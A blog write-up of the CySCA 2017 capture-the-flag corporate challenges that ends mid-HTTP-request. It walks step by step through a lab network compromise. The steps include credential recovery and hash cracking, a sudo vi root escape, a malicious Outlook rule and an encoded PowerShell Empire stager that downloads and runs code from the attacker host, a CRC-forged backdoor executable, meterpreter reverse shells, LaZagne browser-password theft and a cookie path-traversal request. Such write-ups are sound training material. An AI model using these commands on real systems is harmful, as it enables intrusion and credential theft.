---
title: "CySCA 2017 Corporate and IoT Challenges"
date: 2019-03-29
description: "My write-up for the CySCA 2017 CTF Corporate and IoT Challenges"
summary: "My write-up for the CySCA 2017 CTF Corporate and IoT Challenges"
tags: ["CySCA", "CTF", "writeup"]
---
I had the privilege of testing the challenges written for [CySCA](https://www.cyberchallenge.com.au/) 2017, and I thank the challenge creators for allowing me to test them and learn from them.

Here, I will show my write-up for the Corporate and IoT challenges which I found really interesting. I hope you enjoy!

# CySCA 2017 Corporate Challenges

## Challenge 1: you've been srved

Usually, the corporate challenges give you a domain name and put you inside the corporate network. In our case, the domain name is tictoc.cysca

For the first challenge, we get a clue from the name of the challenge and realise that we have to do some DNS enumeration to get SRV records.

```c {hl_lines=[1]}
$ nslookup -type=soa tictoc.cysca
Server:		192.168.5.53
Address:	192.168.5.53#53

Non-authoritative answer:
tictoc.cysca
	origin = ns.tictoc.cysca
	mail addr = admin.tictoc.cysca
	serial = 2017020402
	refresh = 28800
	retry = 7200
	expire = 864000
	minimum = 86400

Authoritative answers can be found from:
tictoc.cysca	nameserver = ns.tictoc.cysca.
```

Getting the Start of Authority information from the DNS server, we find out that the nameserver used by tictoc.cysca is ns.tictoc.cysca

We can then use dig AXFR to do a DNS zone transfer and get all the information from the DNS server:

```c {hl_lines=[1,19,22]}
$ host -t axfr tictoc.cysca 172.16.5.53
Trying "tictoc.cysca"
Using domain server:
Name: 172.16.5.53
Address: 172.16.5.53#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 24562
;; flags: qr aa ra; QUERY: 1, ANSWER: 12, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;tictoc.cysca.			IN	AXFR

;; ANSWER SECTION:
tictoc.cysca.		86400	IN	SOA	ns.tictoc.cysca. admin.tictoc.cysca. 2017020402 28800 7200 864000 86400
tictoc.cysca.		86400	IN	NS	ns.tictoc.cysca.
tictoc.cysca.		86400	IN	A	172.16.5.80
tictoc.cysca.		86400	IN	MX	0 mail.tictoc.cysca.
_flag._udp.tictoc.cysca. 300	IN	SRV	10 10 34532 axfrflag.tictoc.cysca.
autodiscover.tictoc.cysca. 300	IN	A	172.16.5.25
axfrflag.tictoc.cysca.	300	IN	A	172.16.5.174
ftp.tictoc.cysca.	300	IN	A	172.16.5.103
mail.tictoc.cysca.	300	IN	A	172.16.5.25
ns.tictoc.cysca.	300	IN	A	172.16.5.53
www.tictoc.cysca.	300	IN	A	172.16.5.80
tictoc.cysca.		86400	IN	SOA	ns.tictoc.cysca. admin.tictoc.cysca. 2017020402 28800 7200 864000 86400

Received 331 bytes from 172.16.5.53#53 in 165 ms
```

Using AXFR, we get the AXFR flag in a SRV record


## Challenge 2: Cumulonimbus

In this challenge, we are asked to look first at the FTP server (shown at ftp.tictoc.cysca in the DNS records). So let's use an anonymous connection to the FTP server:

```c {hl_lines=[1,22,24]}
$ ftp 172.16.5.103
Connected to 172.16.5.103.
220-###############################################################################
220-#                           _____ _  ________ __   ___                        #
220-#                          |_   _| |/ _/_   _/__\ / _/                        #
220-#                            | | | | \__ | || \/ | \__                        #
220-#                            |_| |_|\__/ |_| \__/ \__/                        #
220-#                  ___ _____ ___      __  ___ ___  _   _  ___ ___             #
220-#                 | __|_   _| _,\   /' _/| __| _ \| \ / || __| _ \            #
220-#                 | _|  | | | v_/   `._`.| _|| v /`\ V /'| _|| v /            #
220-#                 |_|   |_| |_|     |___/|___|_|_\  \_/  |___|_|_\            #
220-#                                                                             #
220-#                    #####! Do not abuse this service !#####                  #
220-#                     #####! all usage is monitored! !#####                   #
220-#                                                                             #
220-###############################################################################
220 
Name (172.16.5.103:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (172,16,5,103,255,49).
150 Here comes the directory listing.
drwxrwx---    2 ftp      ftp          4096 Feb 15 14:18 Documents
drwxrwxr--    7 ftp      ftp          4096 Feb 15 10:27 IDE
drwxrwxr--    2 ftp      ftp          4096 Jan 13 15:26 Printing
drwxrwxr--   10 ftp      ftp          4096 Mar 02 10:15 Software
drwxrwx---    5 ftp      ftp          4096 Mar 07 12:53 home
drwxrwxr--    2 ftp      ftp          4096 Jan 13 15:26 logs
drwxrwxr--    2 ftp      ftp          4096 Mar 06 17:03 tmp
226 Directory send OK.
```

Looking around on the FTP server, we find some interesting files, and download them onto our attacker machine:

```c {hl_lines=[1,3,15,17,26]}
ftp> cd Software
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (172,16,5,103,253,83).
150 Here comes the directory listing.
drwxr-xr-x    5 ftp      ftp          4096 Feb 09 16:04 7-Zip
drwxr-xr-x    5 ftp      ftp          4096 Feb 09 16:04 Audacity
drwxr-xr-x    5 ftp      ftp          4096 Feb 09 16:02 GIMP
drwxr-xr-x    2 ftp      ftp          4096 Feb 09 16:06 HxD
drwxr-xr-x    5 ftp      ftp          4096 Feb 09 16:06 Notepad++
drwxr-xr-x    5 ftp      ftp          4096 Feb 09 16:05 PuTTY
drwxr-xr-x    5 ftp      ftp          4096 Feb 09 16:05 VLC
drwxr-xr-x    2 ftp      ftp          4096 Feb 09 15:56 WinSCP
226 Directory send OK.
ftp> cd WinSCP
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (172,16,5,103,252,165).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp        282968 Feb 07 10:15 WinSCP.com
-rw-r--r--    1 ftp      ftp      18901720 Feb 07 10:15 WinSCP.exe
-rwxrwxrwx    1 ftp      ftp         13854 Mar 02 10:19 WinSCP.ini
-rw-r--r--    1 ftp      ftp         37846 Feb 07 10:15 license.txt
-rw-r--r--    1 ftp      ftp           361 Feb 07 10:15 readme.txt
226 Directory send OK.
ftp> get WinSCP.ini
local: WinSCP.ini remote: WinSCP.ini
227 Entering Passive Mode (172,16,5,103,251,49).
150 Opening BINARY mode data connection for WinSCP.ini (13854 bytes).
226 Transfer complete.
13854 bytes received in 0.06 secs (225.3005 kB/s)
```

Note that WinSCP is a software used for securely copying files to and from file servers. If a user chooses to save their password when using the WinSCP software, their passwords may be stored obfuscated in the WinSCP.ini file.

Looking inside this file, we do see what looks like an obfuscated password:

```c {hl_lines=[1]}
$ cat WinSCP.ini | grep -i password=
QueueRememberPassword=1
PuttyPassword=0
UseMasterPassword=0
Password=A35C775F17BBDA313F283D2E3B39283A282C7228353F28333F723F252F3F3D0F6C0F282E6C323B7D126C281A301C3B08346C
```

As WinSCP stores this password in a retrievable format, people have already made tools to decode these obfuscated values back to the original password. One such tool is [winscppwd](https://bitbucket.org/knarf/winscppwd), which is described as "a simple commmand line tool to recover WinSCP stored passwords". We can run this tool in linux using Wine.

Using this tool, we recover the password:
```c {hl_lines=[1]}
$ wine winscppwd.exe WinSCP.ini 
Could not load wine-gecko. HTML rendering will be disabled.
Could not load wine-gecko. HTML rendering will be disabled.
wine: configuration in '/root/.wine' has been updated.
reading WinSCP.ini
mctarget@ftp.tictoc.cysca	S0Str0ng!N0tFl@gTh0
```

Great! Looks like we got a password we can use for authenticating to the file server!

Using the username and password we now have, we SSH into the file server:
```c {hl_lines=[1,2]}
$ ssh mctarget@172.16.5.103
mctarget@ftp:~$ uname -a
Linux ftp 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux
```

Our next step is to try and get root on this machine, so we enumerate it using common commands for finding privilege escalation vectors e.g. from [g0tmi1k's blog](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/). After some enumeration, we find some interesting output from ```sudo -l```:

```c {hl_lines=[1]}
mctarget@ftp$ sudo -l
Matching Defaults entries for mctarget on ftp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mctarget may run the following commands on ftp:
    (ALL : ALL) !ALL
    (root) /usr/bin/vi /var/ftproot/[A-Za-z0-9_-]*, !/usr/bin/vi */..*, !/usr/bin/vi /var/ftproot/, !/usr/bin/vi */., !/usr/bin/vi * *
```

Specifically, looks like our user, mctarget, is able to execute ```vi``` as root on certain files. Additionally, there are some wildcards used to specify which files we can open with vi with root privileges. There are a few ways I can think of to use this configuration to allow us to privilege escalate:
* Open a file within ```/var/ftproot/``` using ```vi``` and then use ```:sh``` to escape vi and get a shell as root
* Creating a symlink to ```/etc/passwd``` or ```/etc/shadow``` within ```/var/ftproot/```, open it in ```vi```, and then remove the password for the root user allowing us to login with a blank password
* Use the above method but instead of removing the password, add a user to ```/etc/passwd```

Let's just use the simplest method, open a random file within ```/var/ftproot```, and then use ```:sh``` to escape ```vi```:

```c {hl_lines=[1,3,5,6]}
mctarget@ftp:/var/ftproot$ sudo /usr/bin/vi /var/ftproot/testfile
:sh
root@ftp:/var/ftproot# id
uid=0(root) gid=0(root) groups=0(root),1001(ftpusers)
root@ftp:/var/ftproot# cd /root
root@ftp:~# cat flag.txt 
FLAG(9332) CONTACT EXERCISE CONTROL
```

And that's the flag for the second corporate challenge!

## Challenge 3: Get the HASH find the Treasure MAPI

In this challenge, we are told that another user on the FTP server has a SMB file share mounted. Additionally, we have to compromise the mail server (also seen in the original DNS results as mail.tictoc.cysca).

We find an Outlook WebApp server running on the mail server at: https://172.16.5.25/owa/auth/logon.aspx

To get credentials for this server, we first look to confirm that an SMB connection is already established on the server:

```c {hl_lines=[1]}
root@ftp:/home/mctarget# netstat -antup | grep smbd
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      729/smbd        
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      729/smbd        
tcp        0      0 172.16.5.103:445        10.10.5.100:63064       ESTABLISHED 878/smbd        
tcp6       0      0 :::445                  :::*                    LISTEN      729/smbd        
tcp6       0      0 :::139                  :::*                    LISTEN      729/smbd
```

We can see that a connection is established to 172.16.5.103!

Next, to dump SAMBA hashes locally on the FTP machine, we can use a tool called pdbedit as follows:

```c {hl_lines=[1]}
root@ftp:/home/mctarget# pdbedit -L -w
mctarget:1002:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:74D9349DA6D684E0D9ADC303DB64B9EA:[DU         ]:LCT-58AECC49:
madisonw:1003:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:2B2AC2D1C7C8FDA6CEA80B5FAD7563AA:[U          ]:LCT-58D74D46:
```

Note that pdbedit is an in-built samba tool to dump NT hashes, as mentioned [here](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/).

Now we have credentials for another user! Googling the user's hash or using john / hashcat to crack it, we find that the NT hash ```2B2AC2D1C7C8FDA6CEA80B5FAD7563AA``` maps to the password of ```computer```.

We can now use the credentials ```madisonw:computer``` to login to OWA at ```https://172.16.5.25/owa/```

How can we use this access to get a shell or compromise the madisonw user?

Googling a bit on using outlook client access to gain a shell, we come across a nice blog article about [Malicious Outlook Rules](https://silentbreaksecurity.com/malicious-outlook-rules/) and we find a tool called [ruler](https://github.com/sensepost/ruler).

"Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely."

So, to summarise, we can use create a malicious outlook rule for the user to execute code / start an application on the user's machine. The attack involves starting a WebDAV server on our attacker machine to serve an executable or script, and a reverse shell listener. We use ruler to create a malicious outlook rule to fetch our reverse shell executable / script from our WebDAV server and then send an email to the user to trigger the rule.

So let's start Powershell Empire, set up a listener and create a batch script reverse shell:
```c {hl_lines=[1,2,4,5,6,8,9,10]}
root@kali:~/Empire# ./empire
(Empire) > listeners
[!] No listeners currently active 
(Empire: listeners) > set Host http://192.168.5.100
(Empire: listeners) > set Port 8080
(Empire: listeners) > run
[*] Listener 'test' successfully started.
(Empire: listeners) > usestager launcher
(Empire: stager/launcher) > set Listener test
(Empire: stager/launcher) > execute
powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwBUAGUATQAuAE4ARQB0AC4AUwBFAFIAVgBpAGMAZQBQAE8AaQBuAFQATQBhAE4AYQBHAGUAcgBdADoAOgBFAFgAcABlAGMAVAAxADAAMABDAE8ATgB0AEkAbgBVAEUAIAA9ACAAMAA7ACQAdwBDAD0ATgBFAFcALQBPAGIAagBlAEMAVAAgAFMAeQBTAHQARQBNAC4ATgBFAFQALgBXAGUAYgBDAEwAaQBlAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAEQAZQBSAHMALgBBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAUgBPAHgAWQAgAD0AIABbAFMAeQBTAFQARQBNAC4ATgBFAFQALgBXAEUAQgBSAGUAUQB1AEUAcwB0AF0AOgA6AEQARQBGAEEAVQBsAHQAVwBFAEIAUAByAG8AWABZADsAJABXAGMALgBQAFIATwB4AHkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAFkAcwB0AEUATQAuAE4ARQBUAC4AQwByAEUAZABlAE4AVABJAGEAbABDAGEAYwBIAGUAXQA6ADoARABFAEYAQQBVAGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAHQASQBhAGwAUwA7ACQASwA9ACcAYQBiADYANgBhADAANQBlADAAYgA1ADMAZQA4ADEAZQA4ADMAOQBkAGYAZQAzADIANgAwADcANwA4ADgAMgAzACcAOwAkAEkAPQAwADsAWwBjAEgAYQBSAFsAXQBdACQAQgA9ACgAWwBDAEgAYQByAFsAXQBdACgAJAB3AEMALgBEAE8AdwBOAEwAbwBBAEQAUwB0AFIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUALgAxADAAMAA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAGIAWABvAFIAJABLAFsAJABpACsAKwAlACQAawAuAEwARQBuAGcAdABIAF0AfQA7AEkARQBYACAAKAAkAGIALQBKAG8ASQBOACcAJwApAA==
```

We create a ```shell.bat``` file and include the contents above into it, and place it in the folder ```/root/Documents/CySCA/corporate/webdav-serve```. Next, we can use golang with the ```webdavserv.go``` script provided by the creators of the ruler tool to start a WebDAV server as follows:

```c
$ go run webdavserv.go -d /root/Documents/CySCA/corporate/webdav-serve
```

Next, we can use the following code to display the current outlook rules of the user madisonw:

```c
$ ./ruler-linux64 --insecure --url "https://autodiscover.tictoc.cysca/autodiscover/autodiscover.xml" --username madisonw --password computer --email madison.wilton@tictoc.cysca display
```

Note that we guessed the autodiscover URL based upon examples provided on Ruler's github page. From this command, we see that there are currently no outlook rules for madisonw. Next, we can use the following command to create a malicious outlook rule:

```c
$ ./ruler-linux64 --insecure --url "https://autodiscover.tictoc.cysca/autodiscover/autodiscover.xml" --email madison.wilton@tictoc.cysca --username madisonw add --location "\\\\192.168.5.100\\webdav\\shell.bat" --trigger "pop a bat shell" --name maliciousrule
```

In the above line, we add an outlook rule which, when triggered, will download shell.bat from our WebDAV server and execute it. We named our rule ```maliciousrule``` and it will be triggered when madisonw receives an email with the subject of ```pop a bat shell```.

Now, we send an email to madison.wilton@tictoc.cysca from the OWA portal we are logged in to, with the subject of "pop a bat shell", and we receive an reverse connection:

```c
(Empire: stager/launcher) > [+] Initial agent SDE3VALZ2GNZBZMT from 10.10.5.100 now active
```

Great! We confirm our reverse shell as follows:

```c {hl_lines=[1,9,10]}
(Empire: stager/launcher) > agents

[*] Active agents:

  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------          -----------     ------------    ---------           -------             -----    --------------------
  SDE3VALZ2GNZBZMT   10.10.5.100     WORKSTATION     TICTOC\madisonw     powershell/3180     5/0.0    2017-04-15 13:10:15

(Empire: agents) > interact SDE3VALZ2GNZBZMT
(Empire: SDE3VALZ2GNZBZMT) > whoami
TICTOC\madisonw
```

We fetch the flag from madison's Desktop as follows:

```c {hl_lines=[1,3,10]}
(Empire: SDE3VALZ2GNZBZMT) > pwd
C:\Users\madisonw\Desktop
(Empire: SDE3VALZ2GNZBZMT) > ls
LastWriteTime         Length Name            
-------------         ------ ----            
15/03/2017 1:37:34 PM    282 desktop.ini     
13/04/2017 1:53:17 PM     38 flag.txt        
3/03/2017 2:58:04 PM    2691 Outlook 2013.lnk

(Empire: SDE3VALZ2GNZBZMT) > cat flag.txt
FLAG{CIC90HY7KUQRPWPW0XUNWBD4BZAI2051}
```

There we go!

## Challenge 4: SUbterfuge

This challenge asks us to get root on madisonw's machine.

We enumerate the machine looking for ways to escalate our privileges to Administrator. We could use scripts like PowerUp or JAWS to find vectors, however looking at some files on the filesystem showed us clues. Specifically, there was an AutoBackup folder in the root C:/ drive folder. This hints towards a backup script running automatically in the background, possibly in a scheduled task. Looking through the scheduled tasks on the machine, we find one interesting one:

```c {hl_lines=[1]}
(Empire: SDE3VALZ2GNZBZMT) > shell schtasks /Query /tn "Run Backup Madison" /V /fo LIST
Folder: \
HostName:                             WORKSTATION
TaskName:                             \Run Backup Madison
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        26/03/2017 4:19:50 PM
Last Result:                          0
Author:                               WORKSTATION\Administrator
Task To Run:                          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted -WindowStyle Hidden -file "C:\AutoBackup\RunBackup.ps1"
Start In:                             C:\AutoBackup\
Comment:                              Run Automatic backup for Madison
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          madisonw
```

This scheduled task seems to execute a powershell script called ```RunBackup.ps1``` in the AutoBackup folder, but it runs as the madisonw user. Let's have a look at this powershell script:

```powershell {hl_lines=[1]}
(Empire: SDE3VALZ2GNZBZMT) > cat RunBackup.ps1
<-----snip----->
#kill previous if running
Stop-Process -Name "Backup" -Force -ErrorAction SilentlyContinue

#Main
$content = "Backup script running as " + ([Environment]::UserName) + " at " + (Get-Date -Format g) + $OFS
$content >> "C:\AutoBackup\backup.log" 

$ChkFile = "C:\AutoBackup\Backup.exe" 

If ((Test-Path $ChkFile) -eq $True) {
	If ((Get-Crc32($ChkFile)) -eq "0xCA1114C9"){
            $content = "Backup Successful for " + ([Environment]::UserName) + " at " + (Get-Date -Format g) + $OFS
            $content >> "C:\AutoBackup\backup.log"
            Start-Process -FilePath $ChkFile -Wait
   	} else {
       $content = "Backup.exe Checksum failed!!" + $OFS
       $content >> "C:\AutoBackup\backup.log"
   }
}
```

I cut off a majority of the script, and showed the main components. Specifically, you can see above that the PS1 script writes logs to backup.log in the same folder, looks for an executable at ```C:\AutoBackup\Backup.exe```, checks if the CRC32 of this file equals ```0xCA1114C9```, and executes the file is the checksum matches.

Let's have a look at the backup logs:

```c {hl_lines=[1]}
(Empire: SDE3VALZ2GNZBZMT) > shell Get-Content backup.log | Select-Object -Last 10
Backup Successful for markmctarget at 16/04/2017 2:41 PM

Backup script running as markmctarget at 16/04/2017 2:42 PM

Backup Successful for markmctarget at 16/04/2017 2:42 PM

Backup script running as markmctarget at 16/04/2017 2:43 PM

Backup Successful for markmctarget at 16/04/2017 2:43 PM
```

Interestingly, we see that the backup script is actually being run by markmctarget! If we can somehow get our own code executed by this script, we can gain execution as markmctarget. So, let's use the ```cacls``` command to see if we can edit the files in question. We have a look at the PS1 script but unfortunately find that it's not editable by our user. We then look at ```Backup.exe``` and see the following:

```c {hl_lines=[1]}
(Empire: SDE3VALZ2GNZBZMT) > shell cacls Backup.exe
C:\AutoBackup\Backup.exe NT AUTHORITY\Authenticated Users:(ID)C 
                         NT AUTHORITY\SYSTEM:(ID)F 
                         BUILTIN\Administrators:(ID)F 
                         BUILTIN\Users:(ID)R
```

Here, we see that all users in the ```NT AUTHORITY\Authenticated Users``` group have the ability to change the file. The output of cacls can be interpreted using the cacls documentation found [here](https://ss64.com/nt/cacls.html).

Great! So we can change the executable to our own executable. However, we still have to match the CRC32 check that is done in the PS1 script. Unfortunately we cannot remove this check from the PS1 script as we cannot change it, but we can write our own executable and somehow get its CRC32 value to match ```0xCA1114C9```.

First, we can create our own malicious executable as follows:

```c {hl_lines=[1]}
$ cat Dev-backup.c
#include &lt;stdio.h>
#include &lt;stdlib.h>
int main() {
    int x = " + str(randomValue) + ";
    system("c:\\Users\\madisonw\\Documents\\shell.bat");
    return 0;
}
# i686-w64-mingw32-gcc Dev-Backup.c -o Backup.exe
```

In the above, we create a C script which will execute a batch script. We will eventually upload this ```shell.bat``` to madisonw's Documents folder so that our malicious ```Backup.exe``` can find it. Note that the compiler I used to compile the c script into an executable can be installed on Kali using ```apt-get install gcc-mingw-w64-i686```.

Googling for a way to change the file so that the CRC32 matches to a value of our choosing, we find the following article: https://www.nayuki.io/page/forcing-a-files-crc-to-any-value
This article mentions a python script named ```forcecrc32.py``` which takes in the CRC32 value you want to match and the byteoffset of 4 characters you are happy to change in your file. We run this python script as follows:

```c {hl_lines=[1]}
$ python forcecrc32.py Backup.exe 2434 CA1114C9
Original CRC-32: 400B89A6
Computed and wrote patch
New CRC-32 successfully verified
```

Note that we picked a byteoffset of 2434 as the byte values at this location in the executable seemed like they did not affect the actual functionality of the executable. The original bytes of the executable were as follows:

```c {hl_lines=[1]}
$ xxd -s 2434 Backup.exe | head
00000982: aaaa aaaa c704 2424 4040 00e8 1a11 0000  ......$$@@......
00000992: b800 0000 00c9 c390 9090 6690 6690 5383  ..........f.f.S.
000009a2: ec28 a1e4 5340 0089 0424 e87f 0400 0083  .(..S@...$......
000009b2: f8ff 8944 2418 0f84 8200 0000 c704 2408  ...D$.........$.
000009c2: 0000 00e8 4211 0000 a1e4 5340 0089 0424  ....B.....S@...$
000009d2: e859 0400 0089 4424 18a1 e053 4000 8904  .Y....D$...S@...
000009e2: 24e8 4804 0000 8944 241c 8d44 241c 8944  $.H....D$..D$..D
000009f2: 2408 8d44 2418 8944 2404 8b44 2430 8904  $..D$..D$..D$0..
00000a02: 24e8 3c11 0000 89c3 8b44 2418 8904 24e8  $.<......D$...$.
00000a12: 2a04 0000 a3e4 5340 008b 4424 1c89 0424  *.....S@..D$...$
```

Anyway, now that we have our new ```Backup.exe``` that matches the correct CRC32 value, we can upload it to the server and replace the executable in the AutoBackup folder. Remember to also upload our shell.bat powershell empire script also.

```c
(Empire: SDE3VALZ2GNZBZMT) > pwd
C:\Users\madisonw\Documents
(Empire: SDE3VALZ2GNZBZMT) > upload /root/Documents/CySCA/corporate/webdav-serve/webdav/shell.bat
(Empire: SDE3VALZ2GNZBZMT) > cd C:\AutoBackup
(Empire: SDE3VALZ2GNZBZMT) > upload /root/Documents/CySCA/corporate/subterfuge/Backup.exe
(Empire: SDE3VALZ2GNZBZMT) > [+] Initial agent 3ZMXB13RAYTAAPMS from 10.10.5.100 now active
```

After a minute or so, we can see above that we receive another reverse shell! This time, we can see that it is a shell with Administrative privileges (as denoted by the asterisk in Powershell Empire):

```c
(Empire: SDE3VALZ2GNZBZMT) > agents

[*] Active agents:

  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------          -----------     ------------    ---------           -------             -----    --------------------
  SDE3VALZ2GNZBZMT   10.10.5.100     WORKSTATION     TICTOC\madisonw     powershell/5464     5/0.0    2017-04-17 13:12:15
  3ZMXB13RAYTAAPMS   10.10.5.100     WORKSTATION     *TICTOC\markmctargetpowershell/3864     5/0.0    2017-04-17 13:12:13
```

Now we can interact with this new agent, escalate our privileges to SYSTEM (as we have administrative privileges) and get the flag:

```c
(Empire: agents) > interact 3ZMXB13RAYTAAPMS
(Empire: 3ZMXB13RAYTAAPMS) > usemodule privesc/getsystem
(Empire: privesc/getsystem) > execute
[>] Module is not opsec safe, run? [y/N] y
(Empire: privesc/getsystem) > 
Running as: TICTOC\SYSTEM

Get-System completed
(Empire: agents) > interact 3ZMXB13RAYTAAPMS
(Empire: 3ZMXB13RAYTAAPMS) > ls
(Empire: 3ZMXB13RAYTAAPMS) > 
LastWriteTime         Length Name    
-------------         ------ ----    
13/04/2017 1:53:17 PM     38 flag.txt

(Empire: 3ZMXB13RAYTAAPMS) > cat flag.txt
(Empire: 3ZMXB13RAYTAAPMS) > 
FLAG{MXW8S9SHYDLM8C9OPJJZ7DCDH8KE2020}
```

There you go!

## Challenge 5: Delta Factor

This challenge asks us to compromise the Backup server using our current access as markmctarget.

Currently, we have compromised markmctarget / madisonw's computer, but it is not directly accessible by our attacker machine. We can get a reverse shell, but we cannot hit services running on the machine such as RDP. Let's see how we can solve this problem later.

First, let's have a look around the box and enumerate a bit more. Powershell Empire provides modules for collection of data post exploitation. One such module is to collect browser data:

```c
(Empire: collection/browser_data) > usemodule collection/browser_data
(Empire: collection/browser_data) > execute
Job started: Debug32_2ktyr

Browser User          DataType Data                                                                                    
------- ----          -------- ----                                                                                    
IE      markmctarget  History  https://autodiscover.tictoc.cysca/ecp/PersonalSettings/EditAccount.aspx?rfr=olk&chgPh...
IE      markmctarget  History  http://go.microsoft.com/fwlink/p/?LinkId=255141                                         
IE      Administrator Bookmark http://go.microsoft.com/fwlink/p/?LinkId=255142                                         
IE      madisonw      Bookmark http://go.microsoft.com/fwlink/p/?LinkId=255142                                         
IE      markmctarget  Bookmark http://go.microsoft.com/fwlink/p/?LinkId=255142                                         
Firefox markmctarget  History  http://backup.tictoc.cysca                                                              
Firefox markmctarget  History  http://www.mozilla.org                                                                  
Firefox markmctarget  History  http://www.tictoc.cysca                                                                 

Get-BrowserData completed!
```

From the results of this collection module, we can see that markmctarget visited ```backup.tictoc.cysca``` and ```www.tictoc.cysca```!

We get the IP address of as ```backup.tictoc.cysca``` follows:

```c
(Empire: 3ZMXB13RAYTAAPMS) > shell nslookup backup.tictoc.cysca
Server:  dc.tictoc.cysca
Address:  10.10.5.10

Name:    backup.tictoc.cysca
Address:  10.10.5.104
```

Now, let's try to get on RDP on our compromised workstation and access the backup website from there.

The way I thought of doing this was to use meterpreter's ```portfwd``` feature to forward the RDP port to my local attacker machine. So first, let's start a meterpreter listener:

```c
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.5.101
msf exploit(handler) > set LPORT 8081
msf exploit(handler) > exploit
[*] Started HTTPS reverse handler on https://192.168.5.101:8081
[*] Starting the payload handler...
[*] https://192.168.5.101:8081 handling request from 10.10.5.100; (UUID: t9jtkiwp) Staging x86 payload (958531 bytes) ...
```

And then we can invoke shellcode and connect to this listener from our Empire agent as follows:

```c
(Empire: collection/browser_data) > usemodule code_execution/invoke_shellcode
(Empire: code_execution/invoke_shellcode) > set Lport 8081
(Empire: code_execution/invoke_shellcode) > set Lhost 192.168.5.101
(Empire: code_execution/invoke_shellcode) > execute
```

We then receive our meterpreter reverse shell:

```c
[*] Meterpreter session 1 opened (192.168.5.101:8081 -> 10.10.5.100:53770) at 2017-04-18 22:00:52 +1000

meterpreter > getuid
Server username: TICTOC\markmctarget
```

Finally, we can setup a port forward to be able to access RDP directly from our attacker machine:

```c
meterpreter > portfwd add -l 3389 -p 3389 -r 127.0.0.1
```

Now we use ```rdesktop 127.0.0.1``` and the credentials ```TICTOC\madisonw:computer``` to authenticate to the workstation. We can then open a browser and access http://backup.tictoc.cysca. Here, we are provided with a login page. We need to get credentials somehow. As we saw markmctarget access the backup website through firefox, maybe we can get browser credential data from firefox.

Researching online, we find a tool called [LaZagne](https://github.com/AlessandroZ/LaZagne) which "is an open source application used to retrieve lots of passwords stored on a local computer" including credentials from browsers. Let's go to the Releases page on this github, and get the ```laZagne.exe``` file. We then upload it to markmctarget's workstation and execute it from Powershell Empire:

```c
(Empire: actuallyMark32) > shell C:\Users\markmctarget\Documents\laZagne.exe browsers -f
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: markmctarget ##########

------------------- Firefox passwords -----------------

Password found !!!
URL: http://backup.tictoc.cysca
Login: markmctarget
Password: GOD
```

Alright! We now have credentials for http://backup.tictoc.cysca

To generate the TokenCode for the website we want to login to, we actually have to use python code provided within the ```SecurityToken``` folder on markmctarget's Desktop. We setup the IoT device used in the IoT challenges with the password 2fa generating firmware found in this folder and then run python code on ```main.py``` to generate the security tokens.

Once logged in to the backup website, we are introduced to a website which allows us to upload a SSH public key to the ```authorized_keys``` file for markmctarget. Let's play around with this website by port forwarding port 80 on the web server to our local attacker machine:

```c
meterpreter > portfwd add -l 8082 -p 80 -r 10.10.5.104
```

Playing around with the web requests, we figure out that a cookie value is used to determine which folder the server looks into to add to the ```authorized_keys``` file. We can change the cookie value to change the folder in which the ```authorized_keys``` file is added to. So, as long as the web server has permissions to write to this file, we can add our SSH key to root's ```authorised_keys``` file!

```http
POST / HTTP/1.1
Host: 127.0.0.1:8082
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://127.0.0.1:8082/
Cookie: csrftoken=90ZBvy5hp7dzi4lBRixLbEeB0CEaol7j; sessionid=tvtrso6pgaze51gp9h1fceqyavq98iqw; linuxgid=0; linuxuid=0; linuxuser=../root
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 477

